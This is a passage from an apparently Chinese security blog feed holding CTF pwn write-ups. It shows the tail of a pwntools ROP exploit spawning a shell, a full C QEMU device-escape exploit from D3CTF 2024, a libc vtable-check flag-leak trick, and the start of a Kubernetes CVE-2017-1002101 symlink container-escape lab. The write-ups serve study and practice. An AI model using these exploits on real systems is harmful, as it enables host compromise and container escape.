class="hljs-string">&#x27;little&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">arg</span>(<span class="hljs-params">flag,arg</span>):<br>    var=flag.to_bytes(<span class="hljs-number">1</span>,<span class="hljs-string">&#x27;little&#x27;</span>)<br>    <span class="hljs-keyword">if</span> flag==<span class="hljs-number">1</span>:<br>        <span class="hljs-keyword">return</span> var+p64(arg)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> var+arg.to_bytes(<span class="hljs-number">1</span>,<span class="hljs-string">&#x27;little&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">arg</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;\x01&#x27;</span>+arg<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sub</span>(<span class="hljs-params">arg</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;\x02&#x27;</span>+arg<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">rshift</span>(<span class="hljs-params">arg</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;\x03&#x27;</span>+arg<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">lshift</span>(<span class="hljs-params">arg</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;\x04&#x27;</span>+arg<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">mov</span>(<span class="hljs-params">arg</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;\x05&#x27;</span>+arg<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">andd</span>(<span class="hljs-params">arg</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;\x06&#x27;</span>+arg<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">orr</span>(<span class="hljs-params">arg</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;\x07&#x27;</span>+arg<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">xor</span>(<span class="hljs-params">arg</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;\x08&#x27;</span>+arg<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pop</span>(<span class="hljs-params">arg</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;\x09&#x27;</span>+arg<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">push</span>(<span class="hljs-params">arg</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;\x0a&#x27;</span>+arg<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">nop</span>():<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;\x0b&#x27;</span><br><br><br>p=process(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>libc=ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>)<br><br><span class="hljs-comment"># libcbase</span><br>code=mov(args(reg(),inst(),<span class="hljs-number">0</span>,<span class="hljs-number">0x27ff8</span>))<br>code+=nop()<br>code+=mov(args(reg(),mem(),<span class="hljs-number">1</span>,<span class="hljs-number">0</span>))<br>code+=nop()<br>code+=sub(args(reg(),inst(),<span class="hljs-number">1</span>,<span class="hljs-number">0x459a0</span>))<br>code+=nop()<br><br><span class="hljs-comment"># gap</span><br>code+=mov(args(reg(),inst(),<span class="hljs-number">0</span>,<span class="hljs-number">0</span>))<br>code+=nop()<br>code+=nop()<br><br><span class="hljs-comment"># membase</span><br>code+=mov(args(reg(),inst(),<span class="hljs-number">0</span>,<span class="hljs-number">0x28020</span>))<br>code+=nop()<br>code+=mov(args(reg(),mem(),<span class="hljs-number">2</span>,<span class="hljs-number">0</span>))<br>code+=nop()<br>code+=sub(args(reg(),inst(),<span class="hljs-number">2</span>,<span class="hljs-number">0xc040</span>))<br>code+=nop()<br><br><span class="hljs-comment"># gap</span><br>code+=mov(args(reg(),inst(),<span class="hljs-number">0</span>,<span class="hljs-number">0</span>))<br>code+=nop()<br>code+=nop()<br><br><span class="hljs-comment"># save libcbase membase</span><br>code+=mov(args(mem(),reg(),<span class="hljs-number">0</span>,<span class="hljs-number">1</span>))<br>code+=nop()<br>code+=mov(args(reg(),inst(),<span class="hljs-number">0</span>,<span class="hljs-number">8</span>))<br>code+=nop()<br>code+=mov(args(mem(),reg(),<span class="hljs-number">0</span>,<span class="hljs-number">2</span>))<br>code+=nop()<br><br><span class="hljs-comment"># stack cal</span><br>code+=mov(args(reg(),inst(),<span class="hljs-number">0</span>,<span class="hljs-number">0x222200</span>))<br>code+=nop()<br>code+=add(args(reg(),reg(),<span class="hljs-number">1</span>,<span class="hljs-number">0</span>))<br>code+=nop()<br>code+=sub(args(reg(),reg(),<span class="hljs-number">1</span>,<span class="hljs-number">2</span>))<br>code+=nop()<br><br><span class="hljs-comment"># gap</span><br>code+=mov(args(reg(),inst(),<span class="hljs-number">0</span>,<span class="hljs-number">0</span>))<br>code+=nop()<br>code+=nop()<br><br><span class="hljs-comment"># stack</span><br>code+=mov(args(reg(),reg(),<span class="hljs-number">0</span>,<span class="hljs-number">1</span>))<br>code+=nop()<br>code+=mov(args(reg(),mem(),<span class="hljs-number">1</span>,<span class="hljs-number">0</span>))<br>code+=nop()<br>code+=sub(args(reg(),inst(),<span class="hljs-number">1</span>,<span class="hljs-number">0x130</span>))<br>code+=nop()<br><br><span class="hljs-comment"># gap</span><br>code+=mov(args(reg(),inst(),<span class="hljs-number">0</span>,<span class="hljs-number">0</span>))<br>code+=nop()<br>code+=nop()<br><br><span class="hljs-comment"># pie</span><br>code+=mov(args(reg(),reg(),<span class="hljs-number">3</span>,<span class="hljs-number">1</span>))<br>code+=nop()<br>code+=sub(args(reg(),reg(),<span class="hljs-number">3</span>,<span class="hljs-number">2</span>))<br>code+=nop()<br>code+=mov(args(reg(),reg(),<span class="hljs-number">0</span>,<span class="hljs-number">3</span>))<br>code+=nop()<br>code+=mov(args(reg(),mem(),<span class="hljs-number">3</span>,<span class="hljs-number">0</span>))<br>code+=nop()<br>code+=sub(args(reg(),inst(),<span class="hljs-number">3</span>,<span class="hljs-number">0x1ddd</span>))<br>code+=nop()<br>code+=add(args(reg(),inst(),<span class="hljs-number">3</span>,<span class="hljs-number">0x4200</span>-<span class="hljs-number">8</span>))<br>code+=nop()<br><br><span class="hljs-comment"># gap</span><br>code+=mov(args(reg(),inst(),<span class="hljs-number">0</span>,<span class="hljs-number">0</span>))<br>code+=nop()<br>code+=nop()<br><br><span class="hljs-comment"># change membase</span><br>code+=sub(args(reg(),reg(),<span class="hljs-number">3</span>,<span class="hljs-number">2</span>))<br>code+=nop()<br>code+=mov(args(reg(),mem(),<span class="hljs-number">2</span>,<span class="hljs-number">0</span>))<br>code+=nop()<br>code+=mov(args(reg(),reg(),<span class="hljs-number">0</span>,<span class="hljs-number">3</span>))<br>code+=nop()<br>code+=mov(args(mem(),reg(),<span class="hljs-number">0</span>,<span class="hljs-number">1</span>))<br>code+=nop()<br><br><span class="hljs-comment"># gap</span><br>code+=mov(args(reg(),inst(),<span class="hljs-number">3</span>,<span class="hljs-number">0</span>))<br>code+=nop()<br>code+=nop()<br><br>rdi=<span class="hljs-number">0x2a3e5</span><br>ret=<span class="hljs-number">0x29139</span><br>bin_sh=<span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>))<br>system=libc.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]<br><span class="hljs-comment"># rop</span><br>code+=mov(args(reg(),reg(),<span class="hljs-number">1</span>,<span class="hljs-number">2</span>))<br>code+=nop()<br>code+=add(args(reg(),inst(),<span class="hljs-number">1</span>,ret))<br>code+=nop()<br>code+=mov(args(reg(),inst(),<span class="hljs-number">3</span>,<span class="hljs-number">0</span>))<br>code+=nop()<br>code+=mov(args(mem(),reg(),<span class="hljs-number">3</span>,<span class="hljs-number">1</span>))<br>code+=nop()<br><br>code+=mov(args(reg(),reg(),<span class="hljs-number">1</span>,<span class="hljs-number">2</span>))<br>code+=nop()<br>code+=add(args(reg(),inst(),<span class="hljs-number">1</span>,rdi))<br>code+=nop()<br>code+=mov(args(reg(),inst(),<span class="hljs-number">3</span>,<span class="hljs-number">8</span>))<br>code+=nop()<br>code+=mov(args(mem(),reg(),<span class="hljs-number">3</span>,<span class="hljs-number">1</span>))<br>code+=nop()<br><br>code+=mov(args(reg(),reg(),<span class="hljs-number">1</span>,<span class="hljs-number">2</span>))<br>code+=nop()<br>code+=add(args(reg(),inst(),<span class="hljs-number">1</span>,bin_sh))<br>code+=nop()<br>code+=mov(args(reg(),inst(),<span class="hljs-number">3</span>,<span class="hljs-number">0x10</span>))<br>code+=nop()<br>code+=mov(args(mem(),reg(),<span class="hljs-number">3</span>,<span class="hljs-number">1</span>))<br>code+=nop()<br><br>code+=mov(args(reg(),reg(),<span class="hljs-number">1</span>,<span class="hljs-number">2</span>))<br>code+=nop()<br>code+=add(args(reg(),inst(),<span class="hljs-number">1</span>,system))<br>code+=nop()<br>code+=mov(args(reg(),inst(),<span class="hljs-number">3</span>,<span class="hljs-number">0x18</span>))<br>code+=nop()<br>code+=mov(args(mem(),reg(),<span class="hljs-number">3</span>,<span class="hljs-number">1</span>))<br>code+=nop()<br><br><span class="hljs-comment"># end</span><br>code+=nop()<br>code+=nop()<br><br><span class="hljs-comment">#gdb.attach(p)</span><br>p.sendafter(<span class="hljs-string">b&#x27;plz input your vm-code\n&#x27;</span>,code)<br>p.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>WP</category>
      
    </categories>
    
    
    <tags>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2024 d3ctf pwn wp</title>
    <link href="/2024/04/29/2024d3ctf-pwn-wp/"/>
    <url>/2024/04/29/2024d3ctf-pwn-wp/</url>
    
    <content type="html"><![CDATA[<p>比赛就做了一个签到一个php，补一下另外两道能做的</p><span id="more"></span><h1 id="D3BabyEscape"><a href="#D3BabyEscape" class="headerlink" title="D3BabyEscape"></a>D3BabyEscape</h1><h2 id="qemu-pwn基础知识"><a href="#qemu-pwn基础知识" class="headerlink" title="qemu pwn基础知识"></a>qemu pwn基础知识</h2><p>见这个博客👉<a href="https://xz.aliyun.com/t/6562?time__1311=n4+xnD0DRDBAi=GkDgiDlhjmBxQumwD34rD&alichlgref=https://xz.aliyun.com/u/15219">qemu pwn-基础知识</a></p><p>数据结构关系图，以blizzardctf2017的strng为例：</p><img src="/2024/04/29/2024d3ctf-pwn-wp/qemu.png" class title="qemu"><ul><li>TypeInfo：定义类、实例初始化函数</li><li>class_init：初始化父类</li><li>instance_init：初始化子类（对应具体设备）</li><li>realize：初始化实例（使用）</li></ul><h2 id="逆向"><a href="#逆向" class="headerlink" title="逆向"></a>逆向</h2><p>看启动脚本，设备叫l0dev</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">!/bin/sh</span><br>./qemu-system-x86_64 \<br>-L ../pc-bios/ \<br>-m 128M \<br>-kernel vmlinuz \<br>-initrd rootfs.img \<br>-smp 1 \<br>-append &quot;root=/dev/ram rw console=ttyS0 oops=panic panic=1 nokaslr quiet&quot; \<br>-netdev user,id=t0, -device e1000,netdev=t0,id=nic0 \<br>-nographic \<br>-monitor /dev/null \<br>-device l0dev<br></code></pre></td></tr></table></figure><p>滤一下字符串</p><img src="/2024/04/29/2024d3ctf-pwn-wp/l0dev.png" class title="l0dev"><ul><li><p>l0dev可以定位到ldev_info</p><img src="/2024/04/29/2024d3ctf-pwn-wp/info.png" class title="info"><p>继而定位到class_init</p><img src="/2024/04/29/2024d3ctf-pwn-wp/classinit.png" class title="classinit"></li><li><p>l0dev_realize可以定位到realize</p><img src="/2024/04/29/2024d3ctf-pwn-wp/realize.png" class title="realize"></li><li><p>l0dev_instance_init可以定位到instance_init</p><img src="/2024/04/29/2024d3ctf-pwn-wp/instanceinit.png" class title="instanceinit"></li><li><p>剩下的mmio和pmio的read和write函数也可以通过字符串定位</p></li></ul><p>还原的l0dev_state结构体：</p><img src="/2024/04/29/2024d3ctf-pwn-wp/struct.png" class title="struct"><ul><li>l0dev_mmio_read：读有一个acpi_index的偏移</li><li>l0dev_mmio_write：flag设置后可带acpi_index偏移写</li><li>l0dev_pmio_read：读出数据为0x29A时可递增flag</li><li>l0dev_pmio_write：<ul><li>addr为0x40时调用rand_r</li><li>addr为0x80时设置acpi_index</li><li>其他情况正常写</li></ul></li></ul><h2 id="Exp"><a href="#Exp" class="headerlink" title="Exp"></a>Exp</h2><p>l0dev_class_init可以看出vendor_id是0x1234，device_id是0x1919</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">/ # lspci<br>00:04.0 Class 00ff: 1234:1919<br></code></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">/ # cat /proc/ioports<br>  c000-c0ff : 0000:00:04.0<br></code></pre></td></tr></table></figure><p>得到PMIO地址</p><p>流程：</p><ul><li>mmio_write设置acpi_index</li><li>mmio_read溢出泄漏r_rand</li><li>pmio_write正常写0x29A</li><li>pmio_read读0x29A设置flag</li><li>pmio_write溢出写r_rand为system</li><li>mmio_write调用r_rand命令执行</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;errno.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;signal.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;ctype.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;termios.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;assert.h&gt;</span></span><br> <br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/io.h&gt;</span></span><br><br><br><span class="hljs-type">uint32_t</span> pmio_base = <span class="hljs-number">0xc000</span>;<br><br><span class="hljs-type">uint64_t</span> <span class="hljs-title function_">pmio_read</span><span class="hljs-params">(<span class="hljs-type">uint32_t</span> addr)</span><br>&#123;<br><span class="hljs-keyword">return</span> inl(pmio_base + addr) | ((<span class="hljs-type">uint64_t</span>)inl(pmio_base + addr + <span class="hljs-number">4</span>) &lt;&lt; <span class="hljs-number">32</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">pmio_write</span><span class="hljs-params">(<span class="hljs-type">uint32_t</span> addr, <span class="hljs-type">uint64_t</span> val)</span><br>&#123;<br>outl(val &amp; <span class="hljs-number">0xffffffff</span>, pmio_base + addr);<br>outl(val &gt;&gt; <span class="hljs-number">32</span>, pmio_base + addr + <span class="hljs-number">4</span>);<br>&#125;<br><br><br><span class="hljs-type">char</span> *mmio_mem;<br><br><span class="hljs-type">uint64_t</span> <span class="hljs-title function_">mmio_read</span><span class="hljs-params">(<span class="hljs-type">uint64_t</span> addr)</span><br>&#123;<br><span class="hljs-keyword">return</span> *((<span class="hljs-type">uint64_t</span> *)(mmio_mem + addr));<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">mmio_write</span><span class="hljs-params">(<span class="hljs-type">uint64_t</span> addr, <span class="hljs-type">uint64_t</span> val)</span><br>&#123;<br>*((<span class="hljs-type">uint64_t</span> *)(mmio_mem + addr)) = val;<br>&#125;<br><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br><span class="hljs-type">int</span> fd = open(<span class="hljs-string">&quot;/sys/devices/pci0000:00/0000:00:04.0/resource0&quot;</span>, O_RDWR | O_SYNC);<br>mmio_mem = mmap(<span class="hljs-number">0</span>, <span class="hljs-number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_SHARED, fd, <span class="hljs-number">0</span>);<br>iopl(<span class="hljs-number">3</span>);<br><br>mmio_write(<span class="hljs-number">0x80</span>, <span class="hljs-number">0x1c</span>);<br><span class="hljs-type">uint64_t</span> libcbase = mmio_read(<span class="hljs-number">0xf8</span>) - <span class="hljs-number">0x46780</span>;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;libcbase : %llx\n&quot;</span>, libcbase);<br><br><span class="hljs-type">uint64_t</span> system = libcbase + <span class="hljs-number">0x50d70</span>;<br>pmio_write(<span class="hljs-number">0</span>, <span class="hljs-number">0x29a</span>);<br>pmio_read(<span class="hljs-number">0</span>);<br><br>pmio_write(<span class="hljs-number">0xf8</span>, system);<br>mmio_write(<span class="hljs-number">0x40</span>, <span class="hljs-number">0x6873</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="write-flag-where"><a href="#write-flag-where" class="headerlink" title="write_flag_where"></a>write_flag_where</h1><p>可以将flag的某一字节写到libc代码段，输入不合法就退出，合法可以一直改（比赛的时候还看错题了以为只能改一次）</p><ul><li><p>第一次改0x8ca1d+libc_base+3，_IO_vtable_check中取报错字符串的偏移</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> attribute_hidden<br>_IO_vtable_check (<span class="hljs-type">void</span>)<br>&#123;<br><span class="hljs-comment">/* …… */</span><br>  __libc_fatal (<span class="hljs-string">&quot;Fatal error: glibc detected an invalid stdio handle\n&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><img src="/2024/04/29/2024d3ctf-pwn-wp/check.png" class title="check"></li><li><p>第二次改libc_base+0x907a0+5，实际上是__uflow里调用的IO_validate_vtable取__io_vtables地址的部分</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> _IO_jump_t *<br><span class="hljs-title function_">IO_validate_vtable</span> <span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> _IO_jump_t *vtable)</span><br>&#123;<br>  <span class="hljs-type">uintptr_t</span> ptr = (<span class="hljs-type">uintptr_t</span>) vtable;<br>  <span class="hljs-type">uintptr_t</span> offset = ptr - (<span class="hljs-type">uintptr_t</span>) &amp;__io_vtables;<br>  <span class="hljs-keyword">if</span> (__glibc_unlikely (offset &gt;= IO_VTABLES_LEN))<br>    <span class="hljs-comment">/* The vtable pointer is not in the expected section.  Use the</span><br><span class="hljs-comment">       slow path, which will terminate the process if necessary.  */</span><br>    _IO_vtable_check ();<br>  <span class="hljs-keyword">return</span> vtable;<br>&#125;<br></code></pre></td></tr></table></figure><img src="/2024/04/29/2024d3ctf-pwn-wp/uflow.png" class title="uflow"></li></ul><p>两次改完之后再scanf调用__uflow时会因为vtables偏移不对报错，根据报错字符串的移位可以判断flag字符是什么</p><p><em>懒得搓exp了就这样吧，一直想改exit（因为以为只能改一次）能做出来才怪</em></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>WP</category>
      
    </categories>
    
    
    <tags>
      
      <tag>wp</tag>
      
      <tag>qemu</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CVE-2017-1002101</title>
    <link href="/2024/04/14/cve-2017-1002101/"/>
    <url>/2024/04/14/cve-2017-1002101/</url>
    
    <content type="html"><![CDATA[<p>搭了一晚上k8s……脖子疼，幸亏搭好了不然睡不着觉了</p><span id="more"></span><p>原理见👉<a href="https://cloud.tencent.com/developer/article/1889157">逃逸风云再起</a>，不写了</p><ul><li><strong>影响版本</strong>：v1.3.x、v1.4.x、v1.5.x、v1.6.x及低于v1.7.14、v1.8.9和v1.9.4版本</li><li>利用情景：<ul><li>存在Pod安全策略，限制了挂载目录</li><li>具有某命名空间下Pod的创建及相关权限</li></ul></li></ul><h1 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h1><p>ubuntu18.04使用<a href="https://github.com/Metarget/metarget">metarget</a></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo ./metarget gadget install docker --version 18.03.1 --verbose</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo ./metarget cnv install cve-2017-1002101 --domestic --verbose</span><br></code></pre></td></tr></table></figure><p><em><strong>不能用root！不能用root！不能用root！</strong></em></p><h2 id="热身一下"><a href="#热身一下" class="headerlink" title="热身一下"></a>热身一下</h2><p>无安全策略</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo kubectl get podsecuritypolicy</span><br>No resources found.<br></code></pre></td></tr></table></figure><p>创建一个pod</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">apiVersion:</span> <span class="hljs-string">v1</span><br><span class="hljs-attr">kind:</span> <span class="hljs-string">Pod</span><br><span class="hljs-attr">metadata:</span><br>  <span class="hljs-attr">name:</span> <span class="hljs-string">cve-2017-1002101</span><br><span class="hljs-attr">spec:</span><br>  <span class="hljs-attr">containers:</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">test</span><br>    <span class="hljs-attr">image:</span> <span class="hljs-string">busybox:1.28.4</span><br>    <span class="hljs-attr">command:</span> [<span class="hljs-string">&quot;sleep&quot;</span>, <span class="hljs-string">&quot;864000&quot;</span>]<br>    <span class="hljs-attr">volumeMounts:</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-attr">mountPath:</span> <span class="hljs-string">/test</span><br>      <span class="hljs-attr">name:</span> <span class="hljs-string">test-vol</span><br>  <span class="hljs-attr">volumes:</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">test-vol</span><br>    <span class="hljs-attr">hostPath:</span><br>      <span class="hljs-attr">path:</span> <span class="hljs-string">/tmp/test</span><br>      <span class="hljs-attr">type:</span> <span class="hljs-string">DirectoryOrCreate</span><br></code></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo kubectl apply -f cve.yaml</span><br></code></pre></td></tr></table></figure><p><strong>要用1.28.4，老版本docker拉取不了新版本的镜像</strong></p><p>进入pod</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo kubectl <span class="hljs-built_in">exec</span> -it cve-2017-1002101 -- /bin/sh</span><br></code></pre></td></tr></table></figure><p>创建符号链接</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell">cd /test<br>ln -s ../../.. malicious_link<br>ls -l<br>total 0<br>lrwxrwxrwx    1 root     root             8 Apr 14 17:25 malicious_link -&gt; ../../..<br></code></pre></td></tr></table></figure><p>本机查看符号链接</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">ls</span> -l /tmp/test/malicious_link</span><br>lrwxrwxrwx 1 root root 8 Apr 14 10:25 /tmp/test/malicious_link -&gt; ../../..<br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">cat</span> &lt;&lt;<span class="hljs-string">EOF &gt; /here_i_am.txt</span></span><br><span class="hljs-meta prompt_">&gt; </span><span class="language-bash"><span class="hljs-string">Yeah!! I&#x27;m on the host&#x27;s root dir!!</span></span><br><span class="hljs-meta prompt_">&gt; </span><span class="language-bash"><span class="hljs-string">EOF</span></span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">cat</span> /tmp/test/malicious_link/here_i_am.txt</span><br>Yeah!! I&#x27;m on the host&#x27;s root dir!!<br></code></pre></td></tr></table></figure><p>再进入pod</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">cat /test/malicious_link/here_i_am.txt<br>cat: can&#x27;t open &#x27;/test/malicious_link/here_i_am.txt&#x27;: No such file or directory<br></code></pre></td></tr></table></figure><h2 id="浅试一下"><a href="#浅试一下" class="headerlink" title="浅试一下"></a>浅试一下</h2><p>使用subPath挂载malicious_link，再创建一个pod</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">apiVersion:</span> <span class="hljs-string">v1</span><br><span class="hljs-attr">kind:</span> <span class="hljs-string">Pod</span><br><span class="hljs-attr">metadata:</span><br>  <span class="hljs-attr">name:</span> <span class="hljs-string">cve-2017-1002101</span><br><span class="hljs-attr">spec:</span><br>  <span class="hljs-attr">containers:</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">busybox</span><br>    <span class="hljs-attr">image:</span> <span class="hljs-string">busybox:1.28.4</span><br>    <span class="hljs-attr">command:</span> [<span 